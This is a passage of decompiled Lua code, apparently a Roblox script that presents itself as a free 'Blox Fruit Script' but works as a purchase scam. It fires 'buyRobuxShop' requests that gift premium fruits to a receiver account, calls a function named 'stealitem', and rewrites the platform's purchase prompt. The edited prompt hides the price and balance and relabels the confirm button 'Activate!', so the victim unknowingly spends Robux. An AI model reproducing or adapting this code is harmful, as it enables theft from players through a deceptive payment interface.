                            ["StorageName"] = "Permanent Leopard-Leopard",
                            ["PurchaseLocation"] = "FruitShop",
                            ["FunnelId"] = "Shop",
                            ["ReceiverName"] = Username,
                            ["ReceiverUserId"] = vu29
                        }
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v88))
                end
            else
                local v89 = {
                    "buyRobuxShop",
                    {
                        ["Message"] = "Dark On top",
                        ["StorageName"] = "Permanent Kitsune-Kitsune",
                        ["PurchaseLocation"] = "FruitShop",
                        ["FunnelId"] = "Shop",
                        ["ReceiverName"] = Username,
                        ["ReceiverUserId"] = vu29
                    }
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v89))
            end
        else
            local v90 = {
                "buyRobuxShop",
                {
                    ["Message"] = "Dark On top",
                    ["PurchaseLocation"] = "FruitShop",
                    ["StorageName"] = "Permanent Dragon-Dragon",
                    ["FunnelId"] = "Shop",
                    ["ReceiverName"] = Username,
                    ["ReceiverUserId"] = vu29
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v90))
        end
    end
    local function v100()
		-- upvalues: (ref) vu30
        local v91 = vu30:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
        repeat
            task.wait()
        until not v91:FindFirstChild("Prompt")
        stealitem()
        local vu92 = game:GetService("CoreGui")
        local v99, _ = pcall(function()
			-- upvalues: (ref) vu92
            local v93 = vu92:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents")
            v93:WaitForChild("MiddleContent").Visible = false
            local v94 = v93:WaitForChild("Footer")
            local v95 = v94:WaitForChild("Buttons")
            v95:WaitForChild("1").Visible = false
            v94:WaitForChild("FooterContent").Visible = false
            local v96 = v95:WaitForChild("2")
            v96.Visible = true
            local v97 = v96.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
            v97.Text = "Activate!"
            v97.Size = UDim2.new(1, 0, v97.Size.Y.Scale, v97.Size.Y.Offset)
            v96.ButtonContent.ButtonMiddleContent:WaitForChild("Icon").Visible = false
            local v98 = v93:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
            v98.Text = "Activate Blox Fruit Script!"
            v98.Size = UDim2.new(1, 0, v98.Size.Y.Scale, v98.Size.Y.Offset)
        end)
        if not v99 then
            warn("UI..")
        end
    end
    local v101 = vu30
    local v102 = vu30.WaitForChild(v101, "PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
    if v102 then
        v102 = v102.Text:match("(%d+)$")
    end
    if v102 then
        local _ = tonumber(v102) + 25
    end
    local function v104()
		-- upvalues: (ref) vu30, (ref) vu48
        local v103 = vu30:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
        repeat
            task.wait()
        until not v103:FindFirstChild("Prompt")
        vu48()
    end
    v100()
    v104()
end
